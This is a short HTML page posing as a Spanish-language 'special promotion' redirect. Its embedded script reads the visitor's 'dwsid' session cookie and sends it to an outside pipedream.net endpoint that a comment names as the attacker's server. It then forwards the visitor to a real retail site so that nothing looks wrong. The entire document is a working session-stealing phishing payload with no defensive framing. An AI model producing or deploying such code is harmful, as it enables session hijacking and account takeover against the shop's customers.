<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Promoción especial</title>
</head>
<body>
  <h1>Redirigiendo a la oferta...</h1>

  <script>
    // Buscar el valor de la cookie 'dwsid'
    const match = document.cookie.match(/(?:^|; )dwsid=([^;]*)/);
    const dwsid = match ? match[1] : "";

    if (dwsid) {
      // Enviar solo el dwsid al servidor del atacante
      fetch("https://eoozwutroaqr7ij.m.pipedream.net", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "dwsid=" + encodeURIComponent(dwsid)
      })
      .then(() => {
        // Redirigir a la página real para no levantar sospechas
        window.location.href = "https://www.torfs.be";
      });
    } else {
      // Si no se encuentra la cookie, redirigir igual
      window.location.href = "https://www.torfs.be";
    }
  </script>
</body>
</html>
